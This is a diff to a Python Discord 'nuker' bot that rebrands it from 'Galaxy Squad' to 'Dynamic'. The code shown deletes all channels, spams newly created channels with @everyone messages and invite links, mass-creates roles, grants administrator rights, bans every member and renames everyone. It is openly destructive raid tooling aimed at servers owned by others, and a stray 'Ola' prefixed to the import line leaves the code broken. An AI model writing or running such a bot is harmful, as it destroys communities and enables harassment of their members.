@@ -1,4 +1,4 @@
-import discord
+Olaimport discord
 from discord.ext import commands
 from discord.ext.commands import bot
 import colorama
@@ -53,14 +53,14 @@ spam=(f"@everyone https://discord.gg/rAn4qyyedD   https://discord.gg/JmwrcmwZub"
 async def on_guild_channel_create(channel):
  for i in range(0,17):
    embed=discord.Embed(title="Fucked By GalaxySq x OverSq", color=discord.Color.darker_grey())
-   embed.set_image(url="https://c.tenor.com/rZI8abclYegAAAAC/galaxy-squad.gif")
+   embed.set_image(url="https://images-ext-2.discordapp.net/external/rUzJOTVLNaRHfGdmFSbWKiWAb5rw9mZlguwSYnBUfHE/%3Fsize%3D1024/https/cdn.discordapp.com/icons/1010027766802042901/8357f693d586b960f927a337342ce903.png")
    await channel.send(spam,embed=embed)
    
 @bot.command()
 async def galaxy(ctx):
- nombre = "Galaxy x OverSq"
+ nombre = "Dynamic On Top"
  await ctx.message.delete()
- await ctx.guild.edit(name = 'Galaxy Squad wins ',icon=icon)
+ await ctx.guild.edit(name = 'Dynamic wins ',icon=icon)
  for channel in ctx.guild.channels:
   try:
    await channel.delete()
@@ -72,11 +72,11 @@ async def galaxy(ctx):
        print(f"{msgs['+']} canal creado")
  
 @bot.command(name="massrol")
-async def RolMasivo(ctx, amount: int = 247, *, name="#GalaxySq"):
+async def RolMasivo(ctx, amount: int = 247, *, name="#DynamicOnTop"):
     await ctx.message.delete()
     for i in range(amount):
         try:
-            await ctx.guild.create_role(name=name, color=discord.Color.darker_grey())
+            await ctx.guild.create_role(name=name, color=discord.Color.red())
             print(f"{msgs['+']} rol creado")
         except:
             print(f"{msgs['error']} no se pudo crear el rol")               
@@ -92,7 +92,7 @@ async def EliminarRoles(ctx):
             print(f"{msgs['error']} no se pudo eliminar el rol: {r}")
 
 @bot.command(name="admin")
-async def admin(ctx, *, rolename="Galaxy"):
+async def admin(ctx, *, rolename="."):
     await ctx.message.delete()
     try:
         perms = discord.Permissions(administrator=True)
@@ -113,7 +113,7 @@ async def banall(ctx):
             	pass
             
 @bot.command()
-async def nickall(ctx, *, name="#GalaxySq"):
+async def nickall(ctx, *, name="#Dynamic"):
     await ctx.message.delete()
     for m in ctx.guild.members:
             try:
